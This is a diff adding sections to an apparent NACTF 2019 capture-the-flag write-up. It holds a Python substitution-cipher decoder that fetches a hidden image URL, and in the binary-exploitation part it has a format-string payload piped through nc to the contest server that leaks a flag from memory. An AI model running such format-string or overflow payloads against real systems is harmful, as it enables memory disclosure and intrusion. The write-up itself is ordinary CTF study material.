@@ -193,6 +193,58 @@ srimbp-223:ebooks sri$ grep -irE "nactf{.*[aeiou]{7}}" flag.txt
 flag.txt:nactf{r3gul4r_3xpr3ss10ns_ar3_m0r3_th4n_r3gul4r_euaiooa}
 ```
 
+### hwangs handiwork
+
+```
+  1 import requests
+  2 
+  3 # Crypto Substitution Algo
+  4 subs = open("substitution.csv", "r").readlines()
+  5 
+  6 # As we already know the structure of the csv file
+  7 plaintext = subs[0].strip().split(",")[1:]
+  8 ciphertext = subs[1].strip().split(",")[1:]
+  9 print(plaintext, ciphertext)
+ 10 
+ 11 # Build dictionary for faster lookup
+ 12 crypto = {}
+ 13 for i, j in zip(ciphertext, plaintext):
+ 14     if i not in crypto:
+ 15       crypto[i] = j
+ 16     else:
+ 17       print(str(i)+" Already present!")
+ 18 
+ 19 # Ciphertext
+ 20 cipher = list(open("hwangshandiwork.txt", "r").read())
+ 21 print(cipher)
+ 22 decrypt = ""
+ 23 for c in cipher:
+ 24     if c in crypto:
+ 25         decrypt += crypto[c]
+ 26     else:
+ 27         decrypt += c
+ 28 
+ 29 print(decrypt)
+ 30 r = requests.get(decrypt.strip(), allow_redirects=True)
+ 31 print(r.text)
+```
+
+* Solve
+```
+root@kali:~/Downloads/hiddenHandiwork# python solve.py 
+(['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '.', '/', '-', '_', '=', ':'], ['T', 'v', 'm', '9', 'M', 'j', '=', 'S', 'a', 'i', 'w', 'k', 'e', 'C', 'P', 'L', 'X', 'D', 'J', 'c', '8', 'h', 'f', '_', '.', 't', 'I', 'B', 'q', 'R', 'Q', 'Z', 'U', 'n', 'K', 'u', 'l', 'E', '-', '7', '6', 'g', 'N', 'p', '/', 's', 'Y', '3', ':', '4', 'o', 'A', 'x', 'H', 'G', '1', 'b', 'F', 'W', '2', 'z', 'r', 'y', 'd', 'O', 'V', '5', '0'])
+['S', 'c', 'c', 'L', 'J', '0', 'd', 'd', 'k', 'S', 'G', 'y', '=', 'P', 'P', '=', 'k', 'M', '8', 'J', 'M', 'D', 'm', 'P', 'C', 'c', 'M', 'C', 'c', 'y', 'm', 'P', 'e', 'd', 'h', '9', '_', 'r', '_', 'G', 'w', 'D', 't', 't', '.', ':', ':', '/', '.', '1', 'T', 'S', '_', 'B', 'a', ':', 'u', 'U', '9', 'K', 'N', 'p', 'z', 'i', 'r', ':', 'V', 'c', 'N', 'E', 'V', 'K', '/', 'P', 'P', 'D', 'X', 'C', 'I', 'm', 'K', 'l', 'q', 'K', '8', 'r', 'q', 't', 'f', 'O', 'A', 'v', 'i', 's', 'A', '2', 'M', 'I', 'i', 'k', 'f', 'j', 'E', 'q', '1', 'R', 'e', 'F', 'N', 'C', '/', 'g', 'i', '_', 'b', 'f', '5', 'f', 'b', 'r', 'O', 'S', 'x', 'r', 'O', 'D', 'f', ' ', '\r', '\n']
+https://lh3.googleusercontent.com/vdx0x3krzzyWWSy4ahxBiWJGdIQR9j0W_tQL_ISoorqnAcIKCIu0Czw-ZbjTZ8eAjlwfLC4Dm6QnSPjx5w=w50-h10-rw 
+
+RIFF�WEBPVP8X
+4�4�]#�~����f� �� ��
+�LGl�o��:�� }U�M��%i�,�e�|���y���EXIF"II1�Google�����k]{k=i�v"ZJ�v�f�
+```
+
+* Google WebP Images - the image was very small in size so flag was unclear
+  - https://developers.google.com/speed/webp/download
+  - Increase resolution with w5000 and h1000 in the url to get a bigger image and clear flag text
+
 ## Binary Exploitation
 
 ### bufferOverflow
@@ -244,6 +296,15 @@ Type something>You typed AAAAAAAAAAAAAAAAAAAAAAAAAAACCCCUڴ!
 You win!
 flag: nactf{PwN_th3_4rG5_T0o_Ky3v7Ddg}
 
+root@kali:~/Downloads/bufferOverflow2# 
+
+```
+
+### Format String 0
+```
+root@kali:~/Downloads/bufferOverflow2# python -c 'print("%24$s.")' | nc shell.2019.nactf.com 31782
+Type something>You typed: nactf{Pr1ntF_L34k_m3m0ry_r34d_nM05f469}
+.
 root@kali:~/Downloads/bufferOverflow2# 
 
 ```
